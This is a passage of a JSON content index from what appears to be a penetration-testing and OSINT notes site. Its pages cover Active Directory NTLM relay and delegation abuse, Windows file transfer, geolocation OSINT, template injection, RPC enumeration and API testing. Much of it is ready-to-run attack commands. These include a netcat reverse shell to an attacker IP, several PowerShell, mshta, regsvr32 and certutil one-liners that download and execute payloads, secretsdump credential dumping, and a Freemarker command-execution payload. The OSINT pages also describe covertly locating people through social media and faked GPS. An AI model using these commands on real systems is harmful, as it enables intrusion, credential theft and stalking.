DOMAIN/USER:PASSWORD # Then you want to intercept NTLM hashes and forward them to LDAP on a DC # It allows you to impersonate the relayed account and set msDS-AllowedToActOnBehalfOfOtherIdentity ntlmrelayx.py -wh WPAD_Host --delegate-access --escalate-user YOUR_COMPUTER_ACCOUNT\\$ -t ldap://DC.DOMAIN.LOCAL ntlmrelayx.py -wh COMPUTER.DOMAIN.LOCAL --delegate-access --escalate-user YOUR_COMPUTER_ACCOUNT\\$ -t ldap://DC.DOMAIN.LOCAL # Then, start a relay tool (mitm6, responder...) # If another host authenticates succesfully and give impersonation rights, we can then use them # Then you will want to get a valid TGS to connect to the server using our new delegation rights # We can for example choose to impersonate administrators getST.py -spn cifs/Server_You_Relayed_To_Get_RBCD_Rights_On -impersonate TARGET_ACCOUNT DOMAIN/YOUR_CREATED_COMPUTER_ACCOUNT\\$:PASSWORD export KRB5CCNAME=/path/to/ticket.ccache $ python secretsdump.py -k DC1.foo.lan -just-dc "
},
{
	"uri": "/windows-systems/exploitation/file_transfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": " /etc/init.d/pure-ftpd \nSMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\\\KALI_IP (Should display the SHARE_NAME) dir \\\\KALI_IP\\SHARE_NAME copy \\\\KALI_IP\\SHARE_NAME\\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords # Since Windows 10, you can\u0026#39;t do anonymous smb server anymore sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username \u0026#34;peon\u0026#34; -password \u0026#34;peon\u0026#34; net use Z: \\\\192.168.30.130\\SDFR /user:peon peon net use Z: /delete /yimpacket smbserver net use z: \\\\attackerip\\sharename \nBuild a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 \u0026gt; ftp.txt echo USER acknak\u0026gt;\u0026gt; ftp.txt echo jLQRZy4gyLhmMqz2whTw\u0026gt;\u0026gt; ftp.txt echo ftp \u0026gt;\u0026gt; ftp.txt echo bin \u0026gt;\u0026gt; ftp.txt echo GET wget.exe \u0026gt;\u0026gt; ftp.txt echo bye \u0026gt;\u0026gt; ftp.txt # Download the prepared file: ftp -v -n -s:ftp.txt # Start tftp server on Kali aftpd start # Transfer files from Kali to Windows (from windows terminal) tftp -I IPADDRESS GET nameoffile.exe # You can have a shell using this echo open \u0026lt;attacker_ip\u0026gt; 21\u0026gt; ftp.txt echo USER offsec\u0026gt;\u0026gt; ftp.txt echo ftp\u0026gt;\u0026gt; ftp.txt echo bin \u0026gt;\u0026gt; ftp.txt echo GET nc.exe \u0026gt;\u0026gt; ftp.txt echo bye \u0026gt;\u0026gt; ftp.txt ftp -v -n -s:ftp.txt nc.exe \u0026lt;attacker_ip\u0026gt; 1234 -e cmd.exe \nDownloading # Execute file from a WebDav server: cscript //E:jscript \\\\IP\\folder\\payload.txt # Download using wget.vbs cscript wget.vbs http://IP/file.exe file.exe # One liner download file from WebServer: powershell -exec bypass -c \u0026#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\u0026#39;http://webserver/payload.ps1\u0026#39;)|iex\u0026#34; powershell -exec bypass -c \u0026#34;(new-object System.Net.WebClient).DownloadFile(\u0026#39;http://IP/file.exe\u0026#39;,\u0026#39;C:\\Users\\user\\Desktop\\file.exe\u0026#39;)\u0026#34; # Download from WebDAV Server: powershell -exec bypass -f \\\\IP\\folder\\payload.ps1 \nUsing File echo $storageDir = $pwd \u0026gt; wget.ps1 echo $webclient = New-Object System.Net.WebClient \u0026gt;\u0026gt;wget.ps1 echo $url = \u0026#34;http://10.10.14.11/Dropper/Windows/shell.exe\u0026#34; \u0026gt;\u0026gt;wget.ps1 echo $file = \u0026#34;shell.exe\u0026#34; \u0026gt;\u0026gt;wget.ps1 echo $webclient.DownloadFile($url,$file) \u0026gt;\u0026gt;wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 \nDownloading and Execution # Method 1 mshta vbscript:Close(Execute(\u0026#34;GetObject(\u0026#34;\u0026#34;script:http://IP/payload.sct\u0026#34;\u0026#34;)\u0026#34;)) # Method 2 mshta http://IP/payload.hta # Method 3 (Using WebDav) mshta \\\\IP\\payload.hta #Download and execute XSL using wmic wmic os get /format:\u0026#34;https://webserver/payload.xsl\u0026#34; # Download and execute over a WebServer: regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll # Using WebDAV regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll # Powershell Cmdlet Invoke-WebRequest \u0026#34;https://server/filename\u0026#34; -OutFile \u0026#34;C:\\Windows\\Temp\\filename\u0026#34; # Powershell One-Line (New-Object System.Net.WebClient).DownloadFile(\u0026#34;https://server/filename\u0026#34;, \u0026#34;C:\\Windows\\Temp\\filename\u0026#34;) # In Memory Execution IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://server/script.ps1\u0026#39;) \nMultiple ways using certutil # Multiple ways to download and execute files: certutil -urlcache -split -f http://webserver/payload payload # Execute a specific .dll: certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 \u0026amp; certutil -decode payload.b64 payload.dll \u0026amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll # Execute an .exe: certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 \u0026amp; certutil -decode payload.b64 payload.exe \u0026amp; payload.exe \nTips for non-interactive shell using nc # In a case of a non-interactive shell, you can transfer up to 64k of memory # You can increase that size by compressing the willing file (let\u0026#39;s say nc.exe) using: upx -9 nc.exe # nc.exe has now been compressed but remains functional # Now convert it to text instructions using exe2bat wine exe2bat.exe nc.exe nc.txt # Then copy paste the content of nc.txt to the remote shell ! # You\u0026#39;ll get a proper nc.exe using debug.exe from the target !"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/geolocation/",
	"title": "Geolocation &amp; GEOINT",
	"tags": [],
	"description": "",
	"content": " Maps MISC # Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ # 360° pictures database https://www.360cities.net/ # Compare maps by time # Many historical maps http://www.georeferencer.com # Word Postal Codes https://worldpostalcode.com/ Google Maps Alternatives https://twitter.com/y_vdw/status/1339984896022876160 # Other maps services https://yandex.com/maps http://openstreetcam.org/map/ https://www.mapillary.com/ # Search for specific country https://twitter.com/y_vdw/status/1339984940377624576?s=20 https://en.wikipedia.org/wiki/List_of_street_view_services # ZoomEarth provides really great images and features such as estimation and live pictures https://zoom.earth \nRealtime Movement (MISC) Instant StreetView https://www.instantstreetview.com/ # Car embedded cameras tracks https://openstreetcam.org # Mappillary is also a great service providing tons of images from transports # (Cars, Train, etc) # Can be usefull to identify locations where there is no roads (ex : trains) https://www.mapillary.com # Cab Ride Videos from Rail Transport Vehicles https://railcabrides.com/en/ # Sun position over time https://www.suncalc.org/#/48.8376,2.3456,8/2020.05.08/12:42/1/3 # Shadow calculator for GEOINT http://shadowcalculator.eu # Get weather somewhere at a given time https://www.timeanddate.com \nOSINT in the air # Resources and tools lits https://www.osintessentials.com/aviation https://www.aware-online.com/en/osint-tools/airplane-tools/ https://gijn.org/comment-utiliser-la-traque-davions-pour-enqueter/ https://www.youtube.com/watch?v=-NxpTbh9qEw # Aicraft Registration https://en.wikipedia.org/wiki/Aircraft_registration# Online radars https://www.radarbox.com https://www.flightradar24.com https://radar.freedar.uk https://opensky-network.org/network/explorer # Search for flights, aicrafts... https://flightaware.com/ # Uncensored community for gathering informations about flights # Data can be harder to use but usefull if civil are trying to hide data https://www.adsbexchange.com/ # Informations about aircrafts https://www.planespotters.net/ http://www.airframes.org/ https://opensky-network.org/aircraft-database/ # Ownership or others informations https://aerotransport.org/ https://rzjets.net/aircraft/ http://www.airframes.org/ https://www.laasdata.com/corpjet/corpjets-cayman-islands-icao-vp-c.php https://opensky-network.org/datasets/metadata/ # National Registers https://www.aviation-links.co.uk/ https://airdatasearch.com/registers.php http://www.airlinecodes.co.uk/reglinks.asp?type=Official http://www.landings.com/_landings/pages/search/search_nnr-owners.html# Tool to define areas for airports or other stuff https://tools.geofabrik.de/calc/# Specific websites # Private Jet Owners Register https://www.superyachtfan.com/private-jet/owner/ # World leaders aircrafts informations https://www.aircharterserviceusa.com/about-us/news-features/blog/private-jets-of-world-leaders-putin-trump-xi-jinping # Twitter bot used to detect aircrafts movement used in dictatorial countries https://dictatoralert.org/# Military Aircrafts https://www.ads-b.nl/ https://www.scramble.nl/database/military http://www.planeflighttracker.com/2014/03/military-aircraft-tracker.html \nOSINT on the Ocean https://medium.com/@raebaker/osint-on-the-ocean-maritime-intelligence-gathering-techniques-2ee39e554fe1 # Realtime maritime traffic # You can also get infos about a specific ship # Trip timeline https://www.marinetraffic.com # Getting informations about crews # Open jobs and current employees # Seafarers --\u0026gt; People looking for jobs http://maritime-connector.com/ # Similar to the first one # Sometimes more precise informations https://www.vesselfinder.com/ # Shodan can also be used to track communication systems pushing notifications on the Internet # For example : Org: Inmarsat # Dedicated to war ships https://warsearcher.com/shipsearcher/ # Searching for Vessel or Companies https://directories.lloydslist.com/company \nPhoto identification # Find photos taken by the same camera using serial number # We don\u0026#39;t know how files are processed/stored.. https://www.stolencamerafinder.com/ \nAerial Imagery # Aerial Imagery Research https://sector035.nl/articles/aerial-imagery-in-qgis # Aerial pictures of building and monuments https://www.euroluftbild.de/en/ https://www.euroluftbild.de/ # 5 free tools for viewing past aerial imagery https://gisgeography.com/free-historical-imagery-viewers/ https://worldview.earthdata.nasa.gov/ https://livingatlas.arcgis.com/wayback/ https://www.planet.com/explorer/ # Collaborative platform for searching, sharing and viewing aerial images https://soar.earth/ \nOpen Streep Map and Overpass Turbo # WIP - Will probably make a dedicated page when I\u0026#39;ll get more content # Learning https://osmlab.github.io/learnoverpass//en/ # Wiki https://wiki.openstreetmap.org/wiki/Main_Page # All available features https://wiki.openstreetmap.org/wiki/Map_features # Blogposts explaining queries https://bearhunt38.medium.com/geo-locating-photos-with-osm-overpass-api-10ed35b95f11 https://twitter.com/quiztime/status/1336678621910589447# Overpass turbo query - Pedestrian bridge within 100m of Railways [out:json][bbox:{{bbox}}][timeout:800]; // determine set of electrified railways ( way [railway=rail] ; node [railway=rail] ; rel [railway=rail] ; )-\u0026gt;.railways; // put them into the set \u0026#34;railways\u0026#34; // determine set of pedestrian bridges ( way [highway=footway] [bridge=yes]; node [highway=footway] [bridge=yes]; rel [highway=footway] [bridge=yes]; )-\u0026gt;.pedbridge; // put them into the set \u0026#34;pedbridge\u0026#34; // determine set of pedbridges near railways ( node.pedbridge(around.railways:100); way.pedbridge(around.railways:100); rel.pedbridge(around.railways:100); )-\u0026gt;.pedbridgerailway; // put them into the set \u0026#34;pedbridgerailway\u0026#34; // determine pedestrian bridges near railways (.pedbridgerailway;); // return node, ways, relations as determined above out geom meta;# Another example [out:json][timeout:800]; // Get all mills in current bounding box (Netherlands) ( way[“generator:source”=”wind”]({{bbox}}); node[“generator:source”=”wind”]({{bbox}}); relation[“generator:source”=”wind”]({{bbox}}); )-\u0026gt;.mills; // store in variable ‘mills’ // Get all highways in current bounding box and store them in the variable motorways way(around.mills:250)[highway=motorway]-\u0026gt;.motorways; // get all canals near windmills (500m) in current bbox way(around.mills:500)[waterway=canal]-\u0026gt;.canals; // get mills in 100m distance for all identified relevant motorways ( node.mills(around.motorways:250) ; way.mills(around.motorways:250); rel.mills(around.motorways:250); )-\u0026gt;.matchingmills; // get mills in 500 distance for all identified relevant canals // get mills in 500 distance of canals and motorways ( node.matchingmills(around.canals:500); way.matchingmills(around.canals:500); rel.matchingmills(around.canals:500); )-\u0026gt;.matchingmills; // return results, mills and motorways (.matchingmills;); out geom; \nTips \u0026amp; Trick for GeoINT # GREAT resource about tips from Geoguessr https://somerandomstuff1.wordpress.com/2019/02/08/geoguessr-the-top-tips-tricks-and-techniques/ # Second GREAT resource about many countries https://geotips.net/ # Geoguessr is a good tool/game to practice GEOINT skills # These tips can also be applied to a given picture to geolocate and identify # Indoor geolocation # You can use plugs https://www.iec.ch/worldplugs/ # You can crop/blur superficial details on image to enhance reverse image detection https://twitter.com/yarienkiva/status/1267473777849503750 # Identify Plants through image https://identify.plantnet.org/ # DJI provides an interesting view map (like Gmaps) # Sensitive geo points are not blurred and viewable https://www.dji.com/fr/flysafe/geo-map # 3 views realtime map (streetview, satellite, maps) http://data.mashedworld.com/dualmaps/map.htm # GeoIntLocalisator # Simple scrapping tool in Python 3 using selenium to find quickly the distance between two unknown generic locations (supermarket, store...) https://github.com/Th0rr/GeoInt-Localisator # Peakvisor is an app that can be used to get information about mountains # It can help as it can be more precize than Google Earth https://benjaminstrick.com/geolocation-ethiopia-case-on-mountain-profiling-with-peakvisor/ https://peakvisor.com/#remodal-app Image Quality # Poor Image Quality # Street View poor images often comes from USA or Australia # Mainly from remote location and outback areas # Caused by outdated camera Sun and dishes # The sun # If the sun is clearly in the Northern hemisphere, then you are probably in the Southern one # Shadows can help too. If they\u0026#39;re pointing to south --\u0026gt; Southern hemisphere # If sun is overhead, you can be between the Tropic of Capricorn and Tropic of Cancer. # Satellite Dishes # If a satellite dish points south then you are likely in the Northern Hemisphere and vice versa # Upward == Equator # Sun Shadow calculator http://shadowcalculator.eu/#/lat/50.08/lng/19.9 # Several methods for gathering intel using the sun https://s0md3v.medium.com/using-shadows-suns-position-for-osint-fc2378b5f709 https://medium.com/quiztime/lining-up-shadows-2351ae106cec # You can combine it with timeanddate https://www.timeanddate.com Driving # Driving Side # As a general rule, countries of British origin (not Canada) drive on the left # Island countries too (not the Philippines or Iceland) # Others often drive on the right side of the road # Miles vs Km # Only USA, UK, Liberia and Myanmar (Birmanie) use Miles # Speed limit # The USA has signs saying ‘SPEED LIMIT’ and Canada has signs saying ‘MAXIMUM’ Roads # Yellow centre line == North America to the base of South America (Chile is an exception, using yellow lines) # Faded Yellow line normally indicated Mexico or a southern country # South Africa also has yellow centre lines sometimes as does Japan # Yellow side line and white center == South Africa, Botswana, Eswatini and Lesotho# Dashed white lines on the edges == Denmark, Norway, Iceland, Sweden # Norway tend to have yellow center lines # Sweden tend to have white center lines # Finland often has centre yellow lines and centre white dashed line # Double dashed center == Greece # Russia has a road line that is thinner than other countries road lines # Exceptions # Parts of France occasionally pop up with dashed white lines # Another exception is the Dutch islands south west of Rotterdam that are connected to the Netherlands via road bridges. # This area mainly has dashed white lines on the sides of their roads.# European roads tend to be fairly narrow # Contrasting the wide roads of the USA and Canada. # Although roads in Turkey are often wide with many lanes.# Guardrails # Russia and Ukraine == black and white coloured stripes painted # Other European == Simply silver Highway Number Signs # USA # USA County Highways # Smallest ones. # County Highway signs typically have the word “county” on them # These highway signs appear on the map as bland rectangular shapes # Texas Farm Roads # Equivalent as County Highways but for Texas # USA State Highways # These types of highways traverse a solitary state # Virtually each state has its own unique state highway sign with a few exceptions: # Iowa, Mississippi, Delaware and New Jersey share the same # On map highway numbers appear as quasi round white shapes # United States Highways # These highways cross more than one state # The signs appear as a white shield with a black number and black outline to the shield # Odd numbers == South-North # Even numbers == East-West # USA - Interstates # These freeways run across the country. # Signs are conspicuously blue and red and explicitly state ‘Interstate’ # Odd numbers == South-North # Even numbers == East-West# Canadian Highways # Brazilian Highways # Mexican Highways # Russian Federal Highways # Great Britain Highways # Spanish Roads # Japanese Highways https://somerandomstuff1.wordpress.com/2019/02/08/geoguessr-the-top-tips-tricks-and-techniques/ Warning Signs # Diamond shape == North and South America, Australia, New Zeland, Ireland, Japan, South-East Asia # Triangular with red outline and yello colouring # Greece, Finland, Sweden, Iceland, North Macedonia, South Korea,  Houses # Evaluate the expensiveness of houses # Red house or several ones # Probably in Nordic country (Sweden, Norway, Finland, Iceland or Denmark) # USA # Colonial style houses litter the north-east # Ranch style houses often appear in the southern USA states # California bungalows # Conch houses are found in Florida License Plates # Most of Europe have long ones with a blue vertical stripe on the left # Mostly white # Some yellow plates # The Netherlands and Luxembourg have yellow front/rear # UK, Cyprus and Gibraltar have yellow rear and white front # France had yellow ones allowed before 2007 # Only commercials vehicles in Hungary and Denmark have yellow plates # Yellow stripe on the left == Probably Portugal # Blue stripe on both sides == Probably Italy # Red letters on white == Probably Belgium # Vertical red stripes on the left == Isle of Man # No stripe on left/right == Iceland, Liechtenstein, Russia or Switzerland # Nice way to detect Russia from another cyrillic country # Ukraine can have blue and yellow on the left # Before 2016, Crotian ones where fully white (now, blue stripe) # Letters system https://en.wikipedia.org/wiki/Vehicle_registration_plates_of_Europe# USA https://www.insider.com/every-us-state-license-plate-2018-4#alabama-1 # Canada https://en.wikipedia.org/wiki/Canadian_licence_plate_designs_and_serial_formats # Russia has some codes for each zone https://en.wikipedia.org/wiki/Vehicle_registration_plates_of_Russia# Other countries # Indonesia, Malaysia and Macau == Black plates # Philippines == White and green # Laos == Yellow # Bhutan == Fully red # Kyrgyzstan == Red vertical stripe on the left # Japan == Often yellow # Israel == yellow with blue left stripe # Tunisia == Mostly black (sometime red left stripe on the black) # Ghana == Many yellow plates # Senegal == Blue # Colombia == Yellow # Brazilian == Often red# Resources about searching for French license plates https://plaques-immatriculation.info/ https://autorigin.com/ https://www.paruvendu.fr/fiches-techniques-auto/ https://siv-auto.fr/ https://www.oscaro.com/# # License Plates of the World http://worldlicenseplates.com/ # Search for known vehicles or license plates http://platesmania.com Language # You don\u0026#39;t usually need to understand words to know the language/country # ASIA # Japanese # It uses many simple curved strokes that make up their characters such as ノ, シ, い and く # Korean # Usage of circles for instance 요 and 안. # Korean looks quite blocky and rigid in its writing # Chinese # This language is spoken in Taiwan, Hong Kong, Macau and China # Chinese characters tend to be made up of more strokes than Japanese. For example, 麼 and 名 # Hebrew # This language is spoken in Israel # Many of the letters looks like lower case ‘n’ with an extra line added sometimes # Arabic # Similarity to calligraphy and many of the words having a line underneath them # Thaï # Abundant usage of small circles on the ends of most Thai symbols # Cambodian # Small hooks on the top of almost every Cambodian symbol # These hooks point to the right # Indonesian # Common usage of the letter ‘a’ within words # The Indonesian language is also recognisable thanks to the suffixes ‘kan’, ‘an’ or ‘i’ # Appearing frequently at the end of many words # Lao # Distinguish it from Thai by looking for curved letters # The Lao written language has virtually every part of every character curved# South America # Portuguese # Only spoken in Brazil (and Portugal) # contains the ã character # Ç is also a symbol that appears in Portuguese but not Spanish # Spanish # Spanish doesn’t use the previously mentioned ã# Europe https://twitter.com/LockpickingPete/status/1355741207629090816?s=19 https://forum.duolingo.com/comment/33070800 # German --\u0026gt; includes ä, ü and ö # Italian --\u0026gt; ì and à as well as ‘gg’ and ‘cc’. Most words end with a vowel in Italian. # Dutch --\u0026gt; abundance of z and w letters as well as the letter e appearing together as ‘ee’ # and i and j appearing together as ‘ij.’ # Greek --\u0026gt; letters alpha, beta, gamma, delta etc. α, β, γ, δ. # Swedish --\u0026gt; å, ä and ö # Finnish --\u0026gt; ä and a plethora of double letters such as aa and ii # Danish --\u0026gt; contains æ, å and ø # Norwegian --\u0026gt; contains æ, ö and å # Latvian --\u0026gt; contains many letters with different accents above or below them # ļ, ķ, ņ with the line below the letter and ā”, ē, ī, ō, ū, ž # Polish --\u0026gt; The letter z is often paired with other letters such as: rz, sz and cz. # Other curious letters used in Polish include: ó, ł, ż, ś, ȩ and ń # Lithuanian --\u0026gt; Essentially this e with a dot above it is only found in Lithuanian. # The language also contains: š, ž, ū and č# Cyrillic # One good way is to spot a specific letter not used in others variants # Russian / Ukrainian # Look for the letter “ï” or “i” as this letter only occurs in Ukrainian, not in Russia \nRegional Differences # Europe # Birch trees in Norway/Sweden/Finland --\u0026gt; Mostly north # The rocky hills/mountains of Norway tend to be found in the south of this country. # The rest of the Nordic region: Denmark, Finland and the rest of Sweden is void of mountains # Scotland and Ireland have many low rock walls # Another thing to look : road reflection posts (black and white often) # White posts with yellow reflectors --\u0026gt; Denmark # Yellow posts with white reflectors --\u0026gt; Iceland # Posts with a light-greyish stripe surrounding them --\u0026gt; France # White ‘poles’ with a red stripe --\u0026gt; Poland # Posts with a red vertical stripe and black cap --\u0026gt; Serbia / Hungary # Orange vertical stripe within the black section --\u0026gt; Lithuania # Blue pedestrian signs --\u0026gt; Almost only used in Europe https://en.wikipedia.org/wiki/Comparison_of_European_road_signs # Another common sight in Europe is olive trees # Olive trees appear across the entire country of Portugal # In Southern and Central Spain, Southern and Central Italy # Coastal parts of Greece and many islands in the Mediterranean # Sign framing town name with a red line ? Europe convention # If you spot a phone number in France (often listed on businesses) # The area around Paris has a 01 prefix # The north-west corner has 02 # The north-east corner has 03 # The south east corner has 04 # The south-west corner has 05# Australia # Trees in Western Australia tend to be lower and with a bushier foliage # The trees in the eastern states are normally higher and more sprawling # Another aspect to consider is the colour of the dirt. # If the soil has a more reddish colour then you are more likely to be # In Western Australia as opposed to an eastern state.# Africa # In South Africa people are fairly security conscious # often houses will have high walls around them, sometime with spikes. # South Africa has the Afrikaans language that resembles Dutch appearing on some signs. # Botswana’s main roads are in excellent condition, looking almost brand new. # South Africa, Botswana, Eswatini and Lesotho tend to have simultaneous yellow edge road lines and white road centre lines for their major roads.# Asia # Red taxis --\u0026gt; Hong Kong # Japan, South Korea and Taiwan have yellow and black stickers on their utility poles. # UAE --\u0026gt; Wide and quality roads # \u0026#34;PT\u0026#34; on a business sign --\u0026gt; Indonesia. # \u0026#34;Sdn Bhd\u0026#34; on signs --\u0026gt; Malaysia # Differenciate Malaysia and Indonesia --\u0026gt; Chinese caracters often appears in Malaysia # If you see Muslims wearing headwear in Philippines --\u0026gt; Probably Mindanao # There are an abundance of English words in the Philippines # Many Filipino roads are composed of large concrete rectangular blocks # Turkey has red and white coloured road arrows that are fairly unique to their country # (the Philippines and Argentina have them too). # See the ‘ş’ letter appearing on signs, then you are in Turkey# South America # Large satellite dishes in South America are typically Brazilian # The list of Brazilian area codes for phone numbers can be useful as many businesses and signs contain these. https://en.wikipedia.org/wiki/List_of_dialling_codes_in_Brazil # The petrol/gas stations in Argentina are often run by the company known as ‘YPF’. # They have a blue sign with white lettering \nTelegram groups based on location # On Telegram, you can search nearby contacts, using current geolocation # In the contacts settings # It is posible to use it for investigation # By using Android emulators and faking GPS position https://www.bignox.com/ https://www.genymotion.com/ https://www.bluestacks.com/fr/index.html \nCreepy # Creepy is a tool that performs geolocalization through social network inputs # Written in Python, you get a GUI # It uses modules for social networks # You need to first configurate your plugins (using API key for example) # Then you can start a new person project # You choose your plugins, let the soft searches and then add targets to the global search # Once done, you can start searching (often several minutes) # Then you will get locations on the world map for data found # Possible to export results https://www.geocreepy.com/ # virtualenv ? # apt-get remove --purge creepy # apt-get autoremove # pip install -U pytz python-qt flickrapi python-instagram yapsy tweepy google-api-python-client python-dateutil configobj dominate \nKamerka 2.0 (https://github.com/woj-ciech/kamerka) # Build interactive map of cameras, printers, tweets and photos. # The script creates a map of cameras, printers, tweets and photos based on your coordinates. # Everything is clearly presented in form of interactive map with icons and popups. # You can find what interaction on social media have been made in a specific place # All is anonymised for the moment, no username... python kamerka.py --lat 37.235 --lon 115.811111 --dark --twitter --camera --printer \n"
},
{
	"uri": "/other-systems/",
	"title": "Other Systems",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/",
	"title": "ReconDog",
	"tags": [],
	"description": "",
	"content": " General Informations # Recon Dog is an all in one tool for all your basic information gathering needs. # It uses APIs to gather all the information so your identity is not exposed. # Simple and basic standalone python script # All informations seems to be extracted from API\u0026#39;s services, so it fully passive \nModules \u0026amp; Tools • Censys: uses censys.io to collect a large amount of information about an IP address • NS Lookup: Performs name server search • Port scan: Scans the most common TCP ports • Detect CMS: Can detect more than 400 content management systems • Whois Lookup: Performs whois protocol search • Detect honeypot: Uses Shodan to identify whether the target is a honeypot • Find subdomains: Search for sub-domains using com • Reverse IP Lookup: Does an inverse IP lookup to find domains associated with an IP address • Detect technologies: Uses wappalyzer.com to detect over a thousand technologies • All: According to experts in digital forensics, this utility executes all the previous utilities in the target"
},
{
	"uri": "/web-pentest/injections/server-side-injections/ssti/",
	"title": "SSTI",
	"tags": [],
	"description": "",
	"content": " Server Side Template Injection # You can use tools like tplmap ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d \u0026#34;nickname=john\u0026#34; ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d \u0026#34;nickname=john\u0026#34; --os-shell # Freemarker command execution \u0026lt;#assign ex=\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()\u0026gt; ${ ex(\u0026#34;cmd\u0026#34;) } \n"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/tiktok/",
	"title": "TikTok",
	"tags": [],
	"description": "",
	"content": " TikTok # Resources https://www.skopenow.com/news/tiktok-investigations-and-osint-tips # Searching info https://www.osintcombine.com/tiktok-quick-search # Downloader https://ttdown.org/ https://en.savefrom.net/download-from-tiktok # Tiktok Analytics https://cloutmeter.com/ Profile Discovery # Method 1 : You have usernames tiktok.com/@{username} # Method 2 : Involving Dorks site:tiktok.com \u0026#34;username\u0026#34; OR \u0026#34;first and last name\u0026#34; # Method 3 : Search for mentions on other social media \u0026#34;username\u0026#34; OR \u0026#34;first and last name\u0026#34; \u0026#34;tiktok.com\u0026#34; -site:tiktok.com Profile Picture # Method 1 # Right click --\u0026gt; Inspect # Method 2 https://tiktok.com/node/share/user/@{username}?isUniqueId=true # Method 3 (Firefox exclusive) # Media panel by using Ctrl+I # Want 1080 ones ? (@aware_online) 1. Go to TikTok profile http://tiktok.com@{username} 2. Open dev tools (F12) 3. Click on \u0026#34;Network tab\u0026#34; 4. Refresh page (F5) 5. Select \u0026#34;XHR\u0026#34; tab 6. Double click on \u0026#34;api/user/detail/\u0026#34; 7. Open \u0026#34;AvatarLarger\u0026#34; link 8. Have fun! Extracting video content # Pretty much same methods as for pictures # Just need the individual video page, then inspect # Method 2 (Firefox exclusive) # Media panel by using Ctrl+I# Date and timestamp for each videos # In the individual video link, get page sources and search for uploadDate # Convert http://www.timebie.com/std/zulu.php Reach analysis # In tiktok video, feature called \u0026#34;reach\u0026#34; can allow to extract sound from a video and use it # By clicking the link, you can find all videos using the same sound/music Searching for target mentions on other profiles # Looking for TikTok profiles mentionning target in the body but not in the title site:tiktok.com intext:@username -intitle:\u0026#34;username\u0026#34; inurl:video # TikTok allow to link to other social medias # You can search for other mentions, or eventually modified usernames etc. site:youtube.com OR site:instagram.com \u0026#34;username\u0026#34; OR \u0026#34;first and last name\u0026#34; \u0026#34;tiktok\u0026#34; \u0026#34;tik tok\u0026#34; OR intext:\u0026#34;tiktok.com/@username\u0026#34; \n"
},
{
	"uri": "/web-pentest/tools/",
	"title": "Tools",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/network/services-enumeration/135_rpc/",
	"title": "135 - RPC",
	"tags": [],
	"description": "",
	"content": " Resources http://attackerkb.com/Windows/rpcclient rpcclient # Anonymous connection (-N=no pass) rpcclient -U “” -N \u0026lt;ip\u0026gt; # Connection with user rpcclient -U “user” \u0026lt;ip\u0026gt; # Get information about the DC srvinfo # Get information about objects such as groups (enum*) enumdomains enumdomgroups enumalsgroups builtin # Try to get domain password policy getdompwinfo # Try to enumerate different truste domains dsr_enumtrustdom # Get username for a defined user ? getusername # Query user, group etc informations queryuser RID querygroupmem519 queryaliasmem builtin 0x220 # Query info policy lsaquery # Convert SID to names lookupsids SID \nenum4linux # Verbose mode enum4linux -v target-ip # Do everything enum4linux -a target-ip # List users enum4linux -U target-ip # If you\u0026#39;ve managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option enum4linux -u administrator -p password -U target-ip # Get username from the defaut RID range (500-550, 1000-1050) enum4linux -r target-ip # Get username using a custom RID range enum4linux -R 600-660 target-ip # List groups enum4linux -G target-ip # List shares enum4linux -S target-ip # Perform a dictionary attack, if the server doesn\u0026#39;t let you retrieve a share list enum4linux -s shares.txt target-ip # Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows enum4linux -o target-ip # Pull information about printers known to the remove device. enum4linux -i target-ip# enum4linux-ng is a rewrite of the official tool (python3) # adding some features like colors and parsing https://github.com/cddmp/enum4linux-ng"
},
{
	"uri": "/web-pentest/attacking_apis/",
	"title": "Attacking APIs",
	"tags": [],
	"description": "",
	"content": " Resources https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93 https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765 https://github.com/smodnix/31-days-of-API-Security-Tips https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0 https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2 # How to use different known APIs https://github.com/streaak/keyhacks \nSOAP vs REST # REST uses: HTTP, JSON , URL and XML # SOAP uses: mostly HTTP and XML # SOAP can be more recommandded in terms of security, if you have to process critical data. \nChecklist # Test tokens # Authentication token, JWT, Base64 encoded... # Input validation # All entry points (command injection, sql injections, html...) # Cookies, Headers ?  \nTips Authentication # When looking for IDORs and have 401/403 errors, some bypasses : - Wrap ID with an array {“id”:111} --\u0026gt; {“id”:[111]} - JSON wrap {“id”:111} --\u0026gt; {“id”:{“id”:111}} - Send ID twice URL?id=\u0026lt;LEGIT\u0026gt;\u0026amp;id=\u0026lt;VICTIM\u0026gt; - Send wildcard 